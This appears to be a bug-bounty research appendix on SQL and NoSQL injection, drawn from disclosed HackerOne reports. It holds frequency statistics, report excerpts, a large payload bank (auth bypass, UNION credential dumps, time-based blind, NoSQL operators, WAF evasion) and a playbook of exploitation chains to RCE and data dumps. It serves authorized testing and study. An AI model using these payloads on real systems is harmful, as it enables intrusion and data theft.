# Evidence appendix — SQL and NoSQL Injection

Mined from all **331 valid disclosed reports** for this class (84 paid, 25% — payment is not validity).

## Technique frequency (all valid writeups)

| Item | Count |
|---|---:|
| second-order / stored / blind delivery | 68 |
| encoding / double-encode / null byte | 61 |
| header injection (Host / X-Forwarded / etc.) | 52 |
| admin / privileged-role context | 51 |
| WAF / sanitizer / filter bypass | 40 |
| Content-Type / body-format switch | 37 |
| XML / SOAP / SAML / XXE | 33 |
| public source-code / repo review | 27 |
| third-party data / paste / breach reuse | 20 |
| HTTP method / verb tampering | 20 |
| internal service / port / container | 19 |
| cache / CDN / unkeyed header | 18 |
| unauthenticated / removed-cookie test | 16 |
| subdomain / DNS / cert-transparency recon | 13 |
| error message / stack trace probing | 13 |
| intercept & replay request in Burp | 13 |
| OAST / DNS / HTTP callback proof | 9 |
| file upload / filename / extension | 9 |
| race / concurrency / timing | 9 |
| parameter pollution / duplicate keys | 9 |
| fuzzing / wordlist brute force | 8 |
| verbose debug / framework fingerprint | 7 |
| template injection (SSTI) | 6 |
| webhook / OAuth / SAML / integration abuse | 6 |
| JWT / token / base64 decode | 5 |
| API docs / Swagger / introspection | 4 |
| response diff / status / length comparison | 4 |
| JS bundle / source-map inspection | 3 |
| DOM / HTML source inspection | 3 |
| employee / developer public info | 3 |
| parser confusion / normalization | 3 |
| browser DevTools / network tab | 3 |
| swap object ID / parameter value | 3 |
| replay / modify a captured request | 2 |
| archive / Wayback endpoint discovery | 2 |
| deserialization / gadget chain | 2 |
|  HosT/absolute-URL reset poisoning | 2 |
| redirect chain / Location header | 2 |
| search-engine dorking | 1 |
| two-account / cross-account replay | 1 |
| git history / exposed .git | 1 |

## Tools mentioned

| Item | Count |
|---|---:|
| browser | 50 |
| sqlmap | 41 |
| devtools | 24 |
| source-code-review | 20 |
| burp | 15 |
| curl | 13 |
| python | 11 |
| javascript-debugging | 9 |
| burp-repeater | 3 |
| burp-collaborator | 1 |
| collaborator/oast | 1 |
| git | 1 |
| burp-intruder | 1 |
| beautifier | 1 |
| ffuf | 1 |

## Bypass primitives

| Item | Count |
|---|---:|
| blind | 113 |
| time-based | 47 |
| content-type | 42 |
| bypass | 27 |
| backslash | 17 |
| time based | 15 |
| bypasses | 6 |
| bypassed | 5 |
| content type | 3 |
| normalization | 3 |
| second order | 2 |
| url encoded | 2 |
| same-site | 2 |
| bypassing | 2 |
| transfer-encoding | 1 |
| chunked | 1 |
| url encode | 1 |
| whitelist | 1 |
| uppercase | 1 |
| lowercase | 1 |
| out-of-band | 1 |
| trailing space | 1 |

## Impact language

| Item | Count |
|---|---:|
| admin | 261 |
| password | 96 |
| token | 43 |
| localhost | 43 |
| secret | 41 |
| sensitive data | 28 |
| sensitive information | 26 |
| credential | 21 |
| unauthorized | 16 |
| remote code execution | 15 |
| exfiltrate | 13 |
| exfiltration | 8 |
| rce | 7 |
| financial | 4 |
| data leak | 4 |
| arbitrary code | 3 |
| pii | 2 |
| payment | 2 |
| arbitrary command | 2 |
| account takeover | 2 |

## Parameters observed

| Item | Count |
|---|---:|
| phpsessid | 11 |
| pwd | 8 |
| level | 7 |
| risk | 7 |
| data | 7 |
| dbms | 6 |
| tamper | 6 |
| usr | 6 |
| action | 5 |
| rememail | 5 |
| url | 4 |
| v1st | 4 |
| app_id | 4 |
| submit | 4 |
| true | 3 |
| charset | 3 |
| time-sec | 3 |
| type | 3 |
| after_html | 3 |
| order_by | 3 |
| lname | 3 |
| phone_number | 3 |
| pin | 3 |
| acctid | 3 |
| searchtext | 3 |
| _ga | 2 |
| story_id | 2 |
| limit | 2 |
| order | 2 |
| payload | 2 |

## Recurring approach patterns

- **3×** korprit was able to demonstrate this vulnerability by crafting a specially formatted url
  - e.g. @korprit was able to demonstrate this vulnerability by crafting a specially formatted URL.
- **2×** so i decided to sure that this endpoint vulnerable to sql injection or not i using sqlmap as you can see in my poc video
  - e.g. 3: So I Decided To Sure That This Endpoint Vulnerable To Sql Injection Or Not , I Using Sqlmap As You Can See In My PoC Video.
- **1×** motivation i found a sql injection bug in drupal
  - e.g. # Motivation I found a SQL Injection bug in Drupal < 7.32.
- **1×** i found sql injection in conc index php ccm system search users submit poc is below when user login as administrator the user open this link and update user s email address
  - e.g. I found SQL injection in conc/index.php/ccm/system/search/users/submit PoC is below When User login as Administrator the user open this link and update user's email address.
- **1×** and i think i can do various things i tested to work concrete5 on apache using ammps windows8
  - e.g. and I think I can do various things ;) I tested to work concrete5 5.7.2.1 on Apache(using ammps) Windows8
- **1×** hi i noticed you are using a critically vulnerable version of wmpl by accessing attacker could find out is running wmpl version which is vulnerable to
  - e.g. Hi, I noticed you are using a critically vulnerable version of [WMPL]( By accessing Attacker could find out is running WMPL version **3.1.8.4** ######Which is Vulnerable to, 1.
- **1×** however due to our previously vague bug bounty rules we decided to reward the maximum of since we were not previously clear that these were maximums
  - e.g. However due to our previously vague bug bounty rules we decided to reward the maximum of 3,000$ since we were not previously clear that these were maximums.
- **1×** i haven t managed to inject something but i just want to make sure that this input is filtered
  - e.g. I haven't managed to inject something, but I just want to make sure that this input is filtered.
- **1×** when i looked at the plugins all of them were up to date
  - e.g. When I looked at the plugins, all of them were up-to-date.
- **1×** however when i looked up wordpress plugins for q and a plugin i could not find it
  - e.g. However, when I looked up WordPress plugins for **q-and-a** plugin, I could not find it.
- **1×** vulnerabilities sql injection s i discovered that one endpoint is vulnerable to sql injection vulnerabilities due to non escaping of certain parameters 1st vulnerability steps to reproduce
  - e.g. ## Vulnerabilities ### SQL INJECTION(s) I discovered that one endpoint is vulnerable to 2 SQL injection vulnerabilities due to non-escaping of certain parameters #### 1st Vulnerability **Steps to reproduce** 1.
- **1×** i received an advertisement mail from uber and i found the unsubscribe link is different from the original unsubscribe link and there is a sql injection under the unsubscribe link
  - e.g. I received an advertisement mail from Uber and I found the unsubscribe link is different from the original unsubscribe link, and there is a SQL Injection under the unsubscribe link.
- **1×** description impact the impact is probably quite low but i have not checked to see what other data is accessible via the sqli loadfile other databases etc
  - e.g. **Description:** ## Impact The impact is probably quite low but I have not checked to see what other data is accessible via the sqli (loadfile, other databases etc.
- **1×** hi i just found that the post parameter group id for a particularly crafted http request is being vulnerable to injection due to missing parameter sanitization
  - e.g. Hi, I just found that the post parameter "group_id" for a particularly crafted http request is being vulnerable to injection due to missing parameter sanitization.
- **1×** the researcher found a sql injection in one of ours legacy now defunctioned servers
  - e.g. The researcher found a SQL Injection in one of ours legacy (now defunctioned) servers.
- **1×** using the sqlmap tool i was able to confirm this parameter is indeed vulnerable to sql injection
  - e.g. Using the SQLMap tool I was able to confirm this parameter is indeed vulnerable to SQL injection.
- **1×** e g setting the value to returns this terse error although seemingly a less sensitive error message i found this behavior useful
  - e.g. E.g., setting the value to `ä`: ` Returns this terse error: Although seemingly a less sensitive error message, I found this behavior useful.
- **1×** it gave me a fourth option when distinguishing between various behaviors based on my fuzzing of the aforementioned parameter ok and a proper page render when the parameter is set to a valid value
  - e.g. It gave me a fourth option when distinguishing between various behaviors based on my fuzzing of the aforementioned parameter: * `200/OK` and a proper page render when the parameter is set to a valid value.
- **1×** i saw a list of tables which i m guessing contain confidential information such as emails usernames passwords etc
  - e.g. I saw a list of tables which I'm guessing contain confidential information such as emails, usernames, passwords, etc!
- **1×** issue the reporter found a sql injection in one of the applications in www zomato com
  - e.g. ##Issue The reporter found a SQL injection in one of the applications in www.zomato.com.
- **1×** i found an sql injection in the plugin code
  - e.g. I found an SQL injection in the plugin code.
- **1×** using drozer we identified com nextcloud client is vulnerable to sql injection here is output from drozer dz run scanner provider injection a com nextcloud client scanning com nextcloud client
  - e.g. Using Drozer, we identified com.nextcloud.client is vulnerable to Sql Injection here is output from drozer: dz> run scanner.provider.injection -a com.nextcloud.client Scanning com.nextcloud.client...
- **1×** i ve identified an sql injection vulnerability in the website labs data gov that affects the endpoint dashboard datagov csv to json and can be exploited via the user agent http header
  - e.g. I've identified an SQL injection vulnerability in the website **labs.data.gov** that affects the endpoint `/dashboard/datagov/csv_to_json` and can be exploited via the **User-Agent** HTTP header.
- **1×** these are just a few of the sql queries with various arithmetic operations that i ve tried to confirm this issue
  - e.g. These are just a few of the SQL queries with various arithmetic operations that I've tried to confirm this issue.

## Case studies (full excerpts)

### 403616 — [www.zomato.com] SQLi - /php/██████████ - item_id
Eternal · $4500 · critical · https://hackerone.com/reports/403616

Thanks @gerben_javado for helping us keep @zomato secure :) Thanks to the entire @Zomato team for doing this challenge. Its a pleasure to be back in the bug bounty game after a while. #Introduction So I managed to find SQLi on ` in the POST parameter item_id. Debugging and exploiting this issue was somewhat confusing in the beginning because there seems to be database caching going on based on the int value that is given. So for example when you submit item_id=1111-stuffthatchangeshere multiple times the payload won't work anymore. In order to circumvent this caching you need to increment or decrement the integer before the payload every request. # Exploitation I started of simple to really understand that we were dealing with a SQLi. The sleep command was the way for me to proof this and this worked quite easily using my previous discovered Akamai Kona Bypass: From there I wanted to proof data extraction and came up with the following POC: Response time: 6090ms Response time: 910ms This proofs that version() starts with a 5 and shows that we can extract data out of the database. At this point I stopped testing to write the report. Good luck fixing. #Impact Full database access holding private user information.

### 273946 — www.drivegrab.com SQL injection
Grab · $4500 · high · https://hackerone.com/reports/273946

**Summary:** The website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code. **Description:** The plugin allows the site admin to create forms to be filled by users. For this end it implements some AJAX functions, including one to preview (or actually just view) a form. The functionality is probably intended for administrators to be used in the form design phase, but for some reason it is accessible to unauthenticated users. The preview function accepts some parameters. Some of them allows the user to specify HTML and WordPress shortcodes (special WordPress markup) to be included with the preview. One of the shortcodes implemented by the Formidable Pro plugin contains an SQL injection vulnerability. ## Browsers Verified In: N/A ## Steps To Reproduce: Verifying the AJAX preview function with the cURL tool: ~~~~ curl -s -i ' --data 'action=frm_forms_preview' ~~~~ This request shows a preset "contact us" form (if form id is not defined, you'll get the first form in the database). The preview AJAX request accepts some parameters. For example you can define HTML to be shown after the form: ~~~~ curl -s -i ' --data 'action=frm_forms_preview&after_html=hello world' ~~~~ You see that "hello world" appears on the page after the "Contact us" form. The HTML may contain WordPress shortcodes which are special markup in square brackets. There are short

### 2646493 — CVE-2024-42005: Potential SQL injection in QuerySet.values() and values_list()
Internet Bug Bounty · $4263 · high · https://hackerone.com/reports/2646493

Hi IBB :) I found SQL injection in django. you can see my cve (CVE-2024-42005) here: ## Impact QuerySet.values() and values_list() methods on models with a JSONField are subject to SQL injection in column aliases via a crafted JSON object key as a passed *arg. NVD rated the vulnerability sevirity as 9.8.

### 2051931 — Blind SQL injection on id.indrive.com
inDrive · $4134 · critical · https://hackerone.com/reports/2051931

## Summary: The server does not perform sanitization on user input, allowing an attacker to inject arbitrary SQL commands into a query. ## Steps To Reproduce: 1. Go to 2. Click "Сгенерировать". A request to will be made: ████████ 3. Repeat this request, but change the path to: A random entry from the database will be returned: ████ 4. Change the path in a query to: The response from the server will be empty: ███████ **Both requests in curl format** ## Impact This vulnerability allows attackers to inject any SQL statements into a query. For example, I was able to retrieve the SQL version: **PostgreSQL 14.8 (Ubuntu 14.8-0ubuntu0.22.04.1)**

### 150156 — SQL Injection on sctrack.email.uber.com.cn
Uber · $4000 · severity n/a · https://hackerone.com/reports/150156

Hi, Uber Security team I just traveled to China, when I call Uber in China. I received an advertisement mail from Uber and I found the unsubscribe link is different from the original unsubscribe link, and there is a SQL Injection under the unsubscribe link. You can see where to find the unsubscribe link from the attachments. The parameter of user_id is suffered from SQL Injection. Payload You can see the server sleep 12 seconds. I write a script to dump the database name and user name. The username of mysql user is `sendcloud_w@10.9.79.210` The database name is `sendcloud`

### 531051 — SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database
Starbucks · no bounty (valid finding) · critical · https://hackerone.com/reports/531051

As described in the Hacker Summary, @spaceraccoon discovered a SQL Injection vulnerability in a web service backed by Microsoft Dynamics AX. @spaceraccoon demonstrated that the flaw was exploitable via XML-formatted HTTP payload requests to the server. We appreciate @spaceraccoon's clear and thorough report, which helped us quickly and effectively triage the report and remediate the vulnerability. ## False Starts I first came across the endpoint via typical subdomain enumeration. On the surface, it looked like an extremely promising target: a simple HTML file upload form. I began by testing for unrestricted file uploads with PHP shells and such, but it quickly became clear from the verbose error messages that while the files were being sent to the server, they were being processed as XML files and were not saved on the server. Fortunately, the error messages helped me craft a properly-formatted XML file that was accepted by the server. It appeared to be some kind of accounting database entry as it expected nodes like `MainAccount`, `Credit`, `Debit`, `Invoice` and so on. Moreover, the error messages included references to [Microsoft Dynamics AX]( an enterprise financial/accounting software platform. At this point, I started testing for XXE attacks. However, it appeared that external entities were blocked and despite multiple attempts at bypasses, I could only achieve a "Billion

### 297478 — SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent
GSA Bounty · no bounty (valid finding) · critical · https://hackerone.com/reports/297478

I've identified an SQL injection vulnerability in the website **labs.data.gov** that affects the endpoint `/dashboard/datagov/csv_to_json` and can be exploited via the **User-Agent** HTTP header. I didn't extracted any data from the database, I've confirmed the vulnerability using **sleep** SQL queries with various arithmetic operations. The **sleep** command combined with the arithmetic operations will cause the server to sleep for various amounts of time depending on the result of the arithmetic operation. For example, setting the value `Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'` to the `User-Agent` header will cause the server to sleep for **25 (5*5)** seconds. To reproduce, send the following HTTPS request: The server will respond after **25 (5*5)** seconds - same as the value of the `User-Agent:` header. Now, let's cause the server to respond immediately. We will send the value **sleep(5*5*0)** that is equivalent with **0**. The server responded immediately as **5*5*0 = 0**. Let's confirm it with another request: This time the payload contains **6*6-30** that is equal with **6**. The server responded after **6** seconds. These are just a few of the SQL queries with various arithmetic operations that I've tried to confirm this issue. ## Impact An attacker can manipulate the SQL sta

## Full curated payload bank

### Detection & authentication bypass

```text
'
"
')
';
\
' AND 1=1-- -
' AND 1=2-- -
' OR '1'='1
' OR 1=1-- -
" OR "1"="1
' OR '1'='1' --
' OR 1=1#
') OR ('1'='1
'||'1'='1
' AND 'x'='x
admin'--
admin'#
admin'/*
' OR 1=1 LIMIT 1-- -
```

### UNION / error-based

```text
' ORDER BY 1-- -
' ORDER BY 100-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -
-1 UNION SELECT 1,2,3-- -
' UNION ALL SELECT NULL,version(),user()-- -
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
' UNION SELECT username,password FROM users-- -
' AND extractvalue(1,concat(0x7e,version()))-- -
' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
' AND 1=CAST((SELECT version()) AS int)-- -
' AND (SELECT * FROM (SELECT NAME_CONST(version(),1))a)-- -
' AND 1=(SELECT COUNT(*) FROM information_schema.tables)-- -
```

### Time-based blind

```text
' AND SLEEP(5)-- -
' OR SLEEP(5)-- -
'; SELECT SLEEP(5)-- -
' AND (SELECT 5 FROM (SELECT(SLEEP(5)))a)-- -
' AND BENCHMARK(5000000,MD5(1))-- -
'; WAITFOR DELAY '0:0:5'-- -
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -
'; SELECT pg_sleep(5)-- -
'||pg_sleep(5)-- -
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
1;SELECT PG_SLEEP(5)--
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))-- -
```

### NoSQL / operator injection

```text
{"$ne": null}
{"$gt": ""}
{"$regex": "^a"}
{"$where": "sleep(5000)"}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"$or": [{"user": "admin"}, {"user": {"$ne": null}}]}
username[$ne]=x&password[$ne]=x
username[$regex]=^adm&password[$ne]=x
{"username": {"$in": ["admin", "root"]}, "password": {"$ne": "x"}}
{"password": {"$exists": true}}
```

### WAF & filter bypass

```text
'/**/AND/**/1=1-- -
'%09AND%091=1-- -
'%0aAND%0a1=1-- -
'/*!50000AND*/1=1-- -
' UnIoN SeLeCt 1,2,3-- -
' UNION/**/SELECT/**/1,2,3-- -
' UNION%0ASELECT%0A1,2,3-- -
'+UNION+SELECT+1,2,3--+-
'||(SELECT '1')||'
' AND 1=1 AND '1'='1
'/**/OR/**/'1'='1
' %0bOR %0b'1'='1
' AND 0x31=0x31-- -
' AND CHAR(49)=CHAR(49)-- -
' AND ASCII('A')=65-- -
' UNION SELECT 1,2,3 FROM dual-- -
' AND (SELECT 1)=(SELECT 1)-- -
```

### JSON, header & second-order points

```text
{"id": "1 OR 1=1"}
{"sort": "id; SELECT pg_sleep(5)"}
{"filter": {"$where": "this.a == this.a"}}
X-Forwarded-For: 127.0.0.1' OR 1=1-- -
User-Agent: ' OR SLEEP(5)-- -
Referer: ' AND 1=1-- -
Cookie: session=' OR 1=1-- -
id=1&id=2' OR '1'='1
id[]=1' OR '1'='1
id=1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -
```

## Field playbook (unedited)

### quick

- Test every filter/sort/order parameter, including hidden ones from JS and mobile apps.
- Try boolean, time-based, and error-based payloads; note DB-specific syntax.
- Test JSON/GraphQL inputs and array/object params for operator injection.
- Check ORDER BY, LIMIT, column names, and table names where binding is missed.
- Look for second-order injection in stored fields rendered in reports/exports.

### payloads

- Boolean -> `' AND 1=1-- -` `' AND 1=2-- -`
- Time -> `'; SELECT pg_sleep(5)-- -` `' AND SLEEP(5)-- -` `'; WAITFOR DELAY '0:0:5'--`
- Union -> `' UNION SELECT NULL,version(),user()-- -`
- NoSQL -> `{"$ne":null}` `{"$gt":""}` `{"$regex":"^a"}`
- Header -> inject in User-Agent, Referer, X-Forwarded-For, Cookie

### bypass

- Whitespace/comments: `/**/`, `%09`, `%0a`, inline comments between keywords.
- Case mixing and keyword splitting: `UN/**/ION`, `SEL/**/ECT`.
- WAF bypass with JSON/XML encoding, chunked bodies, and parameter pollution.
- Second-order: store payload, trigger in admin report/export.

### surface

- id
- sort
- order
- order_by
- filter
- search
- q
- category
- limit
- offset
- date
- user

### tools

- sqlmap
- Burp
- ghauri
- nuclei
- interactsh

### chain

- SQLi -> auth bypass.
- SQLi -> file read/write -> RCE.
- SQLi -> PII dump.

## Corpus search commands

```sh
python3 ~/.local/share/hackerone-reports/h1.py stats --class sqli
python3 ~/.local/share/hackerone-reports/h1.py search "<feature or param>" --class sqli --limit 10
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```
